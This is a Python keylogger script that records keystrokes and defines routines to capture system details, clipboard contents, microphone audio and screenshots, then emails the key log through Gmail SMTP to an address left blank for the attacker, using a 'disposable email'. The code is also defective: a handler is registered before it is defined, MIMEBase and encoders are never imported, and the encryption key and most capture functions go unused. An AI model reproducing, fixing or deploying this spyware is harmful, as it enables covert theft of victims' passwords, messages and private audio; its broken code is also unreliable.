import keyboard
import time
import os
import smtplib
import platform
import getpass
import clipboard
import wave
import pyaudio
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from cryptography.fernet import Fernet

# Set up variables
keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_syseminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iteration_end = 3

email_address = " " # Enter disposable email here
password = " " # Enter email password here

username = getpass.getuser()

toaddr = " " # Enter the email address you want to send your information to

file_path = " " # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

# Generate encryption key if it doesn't exist
if not os.path.exists(file_path + "Cryptography"):
    os.makedirs(file_path + "Cryptography")
    key = Fernet.generate_key()
    with open(file_path + "Cryptography\\key.key", "wb") as key_file:
        key_file.write(key)

# Load encryption key
with open(file_path + "Cryptography\\key.key", "rb") as key_file:
    key = key_file.read()

# Set up keyboard listener
keyboard.on_press(save_keys)

# Set up functions
def save_keys(event):
    with open(file_merge + keys_information, "a") as f:
        f.write(f"{event.name}\n")

def save_system_info():
    with open(file_merge + system_information, "w") as f:
        f.write(f"Username: {username}\n")
        f.write(f"Computer Name: {platform.node()}\n")
        f.write(f"System: {platform.system()}\n")
        f.write(f"Release: {platform.release()}\n")
        f.write(f"Version: {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Processor: {platform.processor()}\n")

def save_clipboard():
    with open(file_merge + clipboard_information, "w") as f:
        f.write(f"{clipboard.paste()}\n")

def record_audio():
    with wave.open(file_merge + audio_information, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(pyaudio.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        audio = pyaudio.PyAudio()
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        for i in range(0, int(44100 / 1024 * microphone_time)):
            data = stream.read(1024)
            wf.writeframes(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()

def take_screenshot():
    image = ImageGrab.grab()
    image.save(file_merge + screenshot_information)

def send_email():
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger Report"
    body = "Body of the email goes here" # Add the body of your email
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(keys_information, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= " + keys_information)
    msg.attach(part)
    text = msg.as_string()
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, toaddr, text)
    s.quit()

# Main loop
count = 0
keys = []

while True:
    count += 1
    keys.append(keyboard.read_event())
    if count >= number_of_iteration_end:
        with open(keys_information, "w") as f:
            for key in keys:
                k = str(key).replace("'", "")
                f.write(k)
        send_email()
        keys = []
        count = 0
    time.sleep(time_iteration)
